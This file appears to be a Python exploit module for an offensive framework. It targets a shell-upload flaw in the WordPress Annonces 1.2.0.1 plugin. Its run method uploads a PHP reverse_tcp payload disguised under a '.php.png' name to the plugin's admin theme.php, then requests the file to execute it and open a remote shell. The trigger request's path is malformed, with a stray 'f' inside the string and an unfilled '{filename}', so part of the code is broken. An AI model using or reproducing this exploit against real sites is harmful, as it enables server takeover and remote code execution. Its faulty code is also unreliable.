from deathnote_module import *
from lib.http.http_client import Http_client

class Module(Exploit, Http_client):

    __info__ = {
        "name": "WordPress Annonces 1.2.0.1 Shell Upload",
        "description": "WordPress Annonces plugin version 1.2.0.1 suffers from a remote shell upload vulnerability.",
        "cve": "",
        "payload": {
            "default": "payloads/singles/php/reverse_tcp",
            "arch": "php",
            "platform": "php",
            "category": "singles",
            }
    }	
    
    def run(self):

        filename = self.random_text(8)+".php.png"
        payload = "<?php "+self.payload + "?>"
        files = {'theme[change_bouton_recherche]': (filename, payload, "multipart/form-data")}

        r = self.http_request(
                        method="POST",
                        path="/wp-content/plugins/annonces/admin/theme.php",
                        files=files
        )
        if r:
            pwn = self.http_request(
                            method="GET",
                            path="f/wp-content/plugins/annonces/medias/images/{filename}"
            )
        else:
            self.not_vulnerable()